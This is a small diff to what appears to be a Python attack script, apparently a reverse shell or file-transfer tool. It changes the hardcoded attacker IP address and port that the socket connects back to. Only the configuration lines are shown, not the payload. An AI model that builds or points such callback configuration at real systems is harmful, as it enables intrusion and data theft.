@@ -12,7 +12,7 @@ endFile = "EOF"
 if __name__ == '__main__':
 
     # changeable according to Attacker (IPAttacker)
-    IPAttacker = "192.168.1.8"
+    IPAttacker = "192.168.1.2"
     PortAttacker = 2008
     AttackerSocket = (IPAttacker, PortAttacker)
 
